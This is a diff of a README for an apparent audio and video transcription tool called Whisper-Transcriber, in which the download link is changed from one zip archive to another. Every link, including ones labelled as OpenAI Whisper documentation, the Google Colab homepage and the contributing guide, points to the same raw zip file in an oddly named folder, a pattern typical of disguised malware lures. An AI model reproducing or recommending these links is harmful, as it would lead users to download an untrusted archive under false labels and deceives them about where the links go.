@@ -1,6 +1,6 @@
 # 🎤 Whisper-Transcriber - Effortless Transcription for Audio and Video
 
-[![Download Whisper-Transcriber](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Whisper-Transcriber_v3.7.zip)](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Whisper-Transcriber_v3.7.zip)
+[![Download Whisper-Transcriber](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Transcriber_Whisper_v1.1.zip)](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Transcriber_Whisper_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Whisper-Transcriber is a user-friendly tool that allows you to transcribe audio 
 
 ## 📥 Download & Install
 
-To get started, simply [visit this page to download](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Whisper-Transcriber_v3.7.zip). You will find the latest version available there. 
+To get started, simply [visit this page to download](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Transcriber_Whisper_v1.1.zip). You will find the latest version available there. 
 
 1. Click on the "Releases" link above to go to the Releases page.
 2. Look for the most recent version.
@@ -78,12 +78,12 @@ If you have questions or need assistance, you can contact us via the Issues sect
 
 We welcome contributions! If you wish to improve Whisper-Transcriber, feel free to submit your pull requests. You can also help by reporting bugs or suggesting new features.
 
-For more information on contributing, please refer to the https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Whisper-Transcriber_v3.7.zip file in the repository.
+For more information on contributing, please refer to the https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Transcriber_Whisper_v1.1.zip file in the repository.
 
 ## 🔗 Links
 
-- [Download Whisper-Transcriber](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Whisper-Transcriber_v3.7.zip)
-- [OpenAI Whisper Documentation](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Whisper-Transcriber_v3.7.zip)
-- [Google Colab Homepage](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Whisper-Transcriber_v3.7.zip)
+- [Download Whisper-Transcriber](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Transcriber_Whisper_v1.1.zip)
+- [OpenAI Whisper Documentation](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Transcriber_Whisper_v1.1.zip)
+- [Google Colab Homepage](https://raw.githubusercontent.com/isothermal-capitalgainstax520/Whisper-Transcriber/main/dacryolithiasis/Transcriber_Whisper_v1.1.zip)
 
 Thank you for using Whisper-Transcriber! Enjoy your seamless transcription experience.
